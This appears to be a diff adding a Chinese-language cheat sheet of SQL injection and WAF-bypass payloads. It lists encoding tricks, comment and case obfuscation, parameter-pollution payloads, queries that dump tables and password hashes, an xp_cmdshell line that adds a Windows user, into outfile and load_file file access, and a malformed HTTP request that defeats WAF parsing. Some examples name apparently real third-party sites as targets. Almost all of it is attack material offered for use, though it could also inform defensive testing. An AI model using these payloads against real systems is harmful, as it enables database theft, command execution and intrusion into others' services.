@@ -1,0 +1,311 @@
+对参数名进行url编码
+http://127.0.0.1/sql.php?%69d=1
+对参数值进行url编码
+http://127.0.0.1/sql.php?id=1%20%61%6E%64%20%31%3D%32
+对参数值进行双重编码
+http://127.0.0.1/sql.php?id=1%25%32%30%25%36%31%25%36%45%25%36%34%25%32%30%25%33%31%25%33%44%25%33%32
+单引号的一些编码：
+%u0027
+%u02b9
+%u02bc
+%u02c8
+%u2032
+%uff07
+%c0%27
+%c0%a7
+%e0%80%a7
+星号的一些编码：
+%u002a
+%uff0a
+%c0%2a
+%c0%aa
+%e0%80%aa
+使用 Mysql 内置函数 char（）。示例代码:
+char(114)='r'
+1.3 使用 Mysql 内置函数 HEX（）,UNHEX(). ,UNHEX(). ,UNHEX(). ,UNHEX().示例代码：
+通过 str 获取 hex 值:
+select hex("root") 返回结果:726F6F74
+通过 hex 获取 str:
+select unhex( "726F6F74" ) 返回结果: root
+比如:当关键字 root 被过滤时可以用 0x726F6F74 代替 root
+base64变形注入，通过base64编码引发的注入
+http://127.0.0.1/sql.php?id=1
+http://127.0.0.1/sql.php?id=MSBhbmQgMT0y
+判断注入点的姿势
+id=1+OR+0x50=0x50
+id=1+and+5!=6
+And 0 (false)
+And 1 (true)
+And (true)
+And (false)
+'/*!or*/1='1
+or 1=1;%00
+and 1=1
+&&2=2
+or 3=3
+Xor 4=4
+Xor 5 LIKE 5
+or 6 rLiKE 6
+|| 3>2
+&& 3<7
+AnD is null
+AnD is not null
+and '0having'='0having'
+and 1='1
+
+替换空格
+/**/
++
+%20
+'%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F',
+'%0A'
+--%0A
+%23%0A
+%23PTTmJopxdWJ%0A
+%23cWfcVRPV%0A
+‘or+(1)sounds/**/like“1“–%a0-
+‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#
+(0)union(select(table_name),column_name,…
+0%a0union%a0select%09group_concat(table_name)….
+?id=(case(substr((select(group_concat(table_name))from(information_schema.tables)),1,1))when(
+0x61)then(1)else(2)end)
+?id=(0)union(select(table_name),column_name,(0)from(information_schema.columns)having((tab
+le_name)like(0x7573657273)))#
+?id=if((select(count(*))from(information_schema.columns))=187,1,2)
+用过多个空格替换" "=>" "
+用%bf%27 代替单引号
+PostgreSQL 可以用$$代替单引号来突破防注入
+可以达到相似目的的 Mysql 函数
+substring() mid() substr()
+ascii() hex() bin() ord()
+benchmark() sleep()
+
+没有where如何注入：
+源语句：select user from users where user="admin";
+没有where语句：select user from users group by user having user="admin";
+没有union：
+and (select passfrom usersl imit 1)=’secret
+And exists (select * fromuser limit 1)=’admin
+没有limit
+ select pass from users where 1
+ 没有group
+ select substr(user,1) from users //直接爆出全部内容
+ select substr(user,1,1) from users //爆出全部的第一个字符 第二个1可以改为你要爆出的字符长度
+ select substr(user,1,20) from users
+ 没有having
+ select group_concat(user) from users
+ select max(user) from users
+ select max(replace(user,'第一个获取到的内容','')) from users; //这个依次替换文字的地方就能获取所有内容
+ 没有 select
+‘ and
+substr(load_file(‘file’),locate(‘DocumentRoot’,(load_file(‘file’)))+length(‘DocumentRoot’),10)
+=’a
+‘=” into outfile ‘/var/www/dump.txt
+
+ 没有and
+ http://www.ryowa-ceramic.com/company.php?id=if(1=1,(1=1),1) //返回正常
+ http://www.ryowa-ceramic.com/company.php?id=if(1=1,(1=2),1)  //返回错误
+ 没有 or
+1 || substr(user,1,1) = 'a'
+1 || substr(user,1,1) = unhex(61)
+1 || substr(user,1,1) = lower(conv(11,10,36))
+1 || lpad(user,7,1)
+1%0b||%0blpad(user,7,1)
+突破 preg_replace preg_replace preg_replace preg_replace
+http://localhost/sqli.php?id=1+UNunionION+SEselectLECT+1,2,3--
+ 多参数处理规则：
+  web 服务器 | 参数的处理方式 | 例子 |
++--------------------------------------------------------------------------------+
+| ASP.NET/IIS | 用逗号隔开 | par1=val1,val2 |
+| ASP/IIS | 用逗号隔开 | par1=val1,val2 |
+| PHP/Apache | 取最后一个参数的值 | par1=val2 |
+| JSP/Tomcat | 取第一个参数的值 | par1=val1 |
+| Perl/Apache | 取第一个参数的值 | par1=val1
+
+打碎关键字
+使用%打碎关键字
+ http://127.0.0.1/sql.php?id=1 u%onion s%e%l%e%c%t 1,2,3
+ 通过注释符号打碎关键字（不适用于MYSQL>4.1的情况）
+ http://127.0.0.1/sql.php?id=1 un/**/ion se/**/lect 1,2,3
+ 使用%0b打碎关键字
+ http://127.0.0.1/sql.php?id=1 un%0bion se%0blect 1,2,3
+ 使用%0f打碎关键字
+ http://127.0.0.1/sql.php?id=1 uni%6fn
+ 
+ 更改请求方式
+ 
+cookie注入
+示例代码：javascript:alert(documnet.cookie="id"+escpace("51 and 1=1"));
+更改method为post
+
+web服务器和WAF对一些字符的处理
++-----------------------------------------------------------+
+| | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP |
++-----------------------------------------------------------+
+| ?test[1=2 | test_1=2 | test[1=2 |
+| ?test=% | test=% | test= |
+| ?test%00=1 | test=1 | test=1 |
+| ?test=1%001 | NULL | test=1 |
+| ?test+d=1+2 | test_d=1 2 | test d=1 2 |
++----------------------------------------------------------------------+
++-------------------------------------------------------------------- --------+
+| Keywords | WAF | ASP/ASP.NET |
++-----------------------------------------------------------------------------+
+| sele%ct * fr%om.. | sele%ct * fr%om.. | select * from.. |
+| ;dr%op ta%ble xxx | ;dr%op ta%ble xxx | ;drop table xxx |
+| <scr%ipt> | <scr%ipt> | <script> |
+| <if%rame> | <if%rame> | <iframe> |
++-----------------------------------------------------------------------------+
+
+突破安全狗
+安全狗本 身对 xx.asp?id=69 and 1=1 和 xx.asp?id=69 and 1=2 这些是过 滤的，可是对
+xx.asp?sqli.com=%00.&xw_id=69%20 and 1=1 和 xx.asp?sqli.com=%00.&xw_id=69%20 and
+1=2 却是正常，直接丢到工具就 OK 了
+
+缓冲区溢出
+突破用 C 语言编写的 WAF
+示例代码：
+http://localhost/sqli.php?id=1+and+(select 1)=(select
+0x414141414141441414141414114141414141414141414141414141
+414141414141?.)+union+select+1,2,version(),database(),user(),6,7,8,9,10--
+
+组合攻击
+asp 和 asp.net 的 Request 对象存在一个包解析漏洞，Request 对象对于 GET 和 POST 包的解
+析过于宽松，用一句话表达就是 Request 对象它 GET 和 POST 傻傻分不清楚，稍有点 web
+开发经验的同学应该知道 Request 接收 GET,POST,COOKIE 也就是 GPC 传过来的数据，但
+是 asp 和.net 库内置的 Request 对象完全不按 RFC 标准来，下面我们可以做个测试：
+我们发送的原始包是：
+GET /1.asp HTTP/1.1
+Host: 192.168.239.129
+Content-Length: 34
+Content-Type: application/x-www-form-urlencoded
+t=’/**/or/**/1=1–
+结果返回如下：
+Request:’/**/or/**/1=1–
+将 python 测试脚本的 path 改为/1.aspx 测试页返回同样结果。
+我们可以看到这是一个畸形的 HTTP GET 请求包，这个包的奥秘在于 t=’/**/or/**/1=1–参数后的 8 个回车换行和 Content-Length 头，包的结构类似于一个 POST 包，而请求的方法是
+GET,最后 asp 和 asp.net 的 Request 对象成功的解析了这个畸形包取出了数据。
+所以如果 WAF 没有处理好 HTTP 包的内容，沿用常规思路处理 GET 和 POST 的逻辑的话，
+那么这个畸形包将会毁掉 WAF 的基础防御。
+
+关键字的大小写转换
+SelECt
+UnIoN
+FroM
+UnioN AIL
+GrOuP_ConCAt()
+
+/**/为注释
+/*!*/执行/*!*/里面的内容
+
+（遇狗可借鉴下面的操作）
+对参数值进行污染处理
+localhost/sqli.php?id=123 uNiOn All sEleCt/*We are bypassing the WAF*/select/*Rafay Hacking
+Artcles*/1,2,3,4,5--
+0/**/union/*!50000select*/table_name`foo`/**/…
+http://localhost/sqli.aspx?q=select/*&q=*/name&q=password/*&q=*/from/*&q=*/users
+http://localhost/sqli.aspx?id=1'; /*&id=1*/ EXEC /*&id=1*/ master..xp_cmdshell
+/*&id=1*/ ?net user lucifer UrWaFisShiT? /*&id=1*/ --
+/?id=1/*union*/union/*select*/select+1,2,3/*
+id=1+union/*&name=*/select+1,2 （存在参数 name）
+http://www.f4le.com/member/ajax_membergroup.php?[url=mailto:00.&action=post&membergrou
+p=@%60]action=post&membergroup=@`'[/url]` Union select pwd from `%23@__admin` where
+1 or id=@`'`
+http://www.f4le.com/member/ajax_membergroup.php?0dayf4le.com=%[url=mailto:00.&action=p
+ost&membergroup=@`]00.&action=post&membergroup=@`'[/url]` Union select pwd from
+`%23@__admin` where 1 or id=@`'`
+
+group_concat()的 1024 chars 的解决方案
+select group_concat(substr(user,1,1)) from users; //取从第一个字符到第一个字符
+select group_concat(substr(user,1,5)) from users; //取从第一个字符到第五个字符
+查询语句写到注释当中
+http://127.0.0.1/sql.php? /*!union*/**/*!select 1,user(),database()*/
+http://127.0.0.1/sql.php?/*dsadsasdd*/*!and*/*The is by pass*/*!1=2*/
+注释符
+%23 （#的url编码）[建议养成使用%23的习惯]
+-- (后面有个空格所有建议直接使用--+)
+/**/
+%00(在MS access当中可以当注释符号来用)
+
+突破防注入代码小抄
+%00' UNION SELECT password FROM Users WHERE username='admin'--+
+IFNULL(1, 2) 可以改写成 IF(ISNULL(1), 2, 1)
+0′union all select all`table_name`foo from`information_schema`. `tables
+value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNUL
+L(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,5
+8)), NULL, NULL#/*!0AND 'QDWa'='QDWa
+SELECT * FROM users WHERE id LIKE 1
+SELECT FIELD%20FROM TABLE 可以写成
+%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u004
+4%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045
+'A> B'可以写成 'ANOT BETWEEN 0 AND B'
+1' AND SLEEP(5)# 可以写成 MScgQU5EIFNMRUVQKDUpIw==
+AND '1'='1' 可以写成 AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87
+load_file/*foo*/(0×616263)
+http://localhost/sqli.php?id=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1
+%2C2%2Ccurrent_user
+http;//127.0.0.1/1.asp?id=(1)anandd(1=1)
+试试不要用 /etc/passwd. 用 /foo/../etc/bar/../passwd.
+Dumpfile 虽然只能导出一行数据，但必要时还是应该可以拿来和 outfile 换一下的
+
+一些mysql函数
+substr(‘abc’,1,1) = ‘a’
+substr(‘abc’ from 1 for 1) = ‘a’
+substring(‘abc’,1,1) = ‘a’
+substring(‘abc’ from 1 for 1) = ‘a’
+mid(‘abc’,1,1) = ‘a’
+mid(‘abc’ from 1 for 1) = ‘a’
+lpad(‘abc’,1,space(1)) = ‘a’
+rpad(‘abc’,1,space(1)) = ‘a’
+left(‘abc’,1) = ‘a’
+reverse(right(reverse(‘abc’),1)) = ‘a’
+insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’
+space(0) = trim(version()from(version()))
+locate(‘a’,'abc’)
+position(‘a’,'abc’)
+position(‘a’ IN ‘abc’)
+instr(‘abc’,'a’)
+substring_index(‘ab’,'b’,1)
+length(trim(leading ‘a’ FROM ‘abc’))
+length(replace(‘abc’, ‘a’, ”))
+strcmp(‘a’,'a’)
+mod(‘a’,'a’)
+find_in_set(‘a’,'a’)
+field(‘a’,'a’)
+count(concat(‘a’,'a’))
+length()
+bit_length()
+char_length()
+octet_length()
+bit_count()
+
+姿势大全
+新姿势 1:
+strcmp(left('password',1), 0x69) = 1
+strcmp(left('password',1), 0x70) = 0
+strcmp(left('password',1), 0x71) = -1
+变换姿势: /*mid()函数用于得到字符串的一部分*/
+select user from mysql.user where user = 'user' OR mid(password,1,1)='*'  //获取user表中字段的'user'然后输出字段内容里面有个*的
+select user from mysql.user where user = 'user' OR mid(password,1,1)=0x2a
+select user from mysql.user where user = 'user' OR mid(password,1,1)=unhex('2a')
+select user from mysql.user where user = 'user' OR mid(password,1,1) regexp '[*]'
+select user from mysql.user where user = 'user' OR mid(password,1,1) like '*'
+select user from mysql.user where user = 'user' OR mid(password,1,1) rlike '[*]'
+select user from mysql.user where user = 'user' OR ord(mid(password,1,1))=42
+select user from mysql.user where user = 'user' OR ascii(mid(password,1,1))=42
+select user from mysql.user where user = 'user' OR find_in_set('2a',hex(mid(password,1,1)))=1
+select user from mysql.user where user = 'user' OR position(0x2a in password)=1
+select user from mysql.user where user = 'user' OR locate(0x2a,password)=1
+select user from mysql.user where user = 'user' OR substr(password,1,1)=0x2a
+select user from mysql.user where user = 'user' OR substring(password,1,1)=0x2a
+新姿势 2:
+false !pi() 0 ceil(pi()*pi()) 10 A ceil((pi()+pi())*pi()) 20 K
+true !!pi() 1 ceil(pi()*pi())+true 11 B ceil(ceil(pi())*version()) 21 L
+true+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 M
+floor(pi()) 3 floor(pi()*pi()+pi()) 13 D ceil((pi()+ceil(pi()))*pi()) 23 N
+ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 E ceil(pi())*ceil(version()) 24 O
+floor(version()) 5 ceil(pi()*pi()+version()) 15 F floor(pi()*(version()+pi())) 25 P
+ceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Q
+ceil(pi()+pi()) 7 ceil(pi()*version()) 17 H ceil(version()*version()) 27 R
+floor(version()+pi()) 8 ceil(pi()*version())+true 18 I ceil(pi()*pi()*pi()-pi()) 28 S
+floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 J floor(pi()*pi()*floor(pi())) 29 T
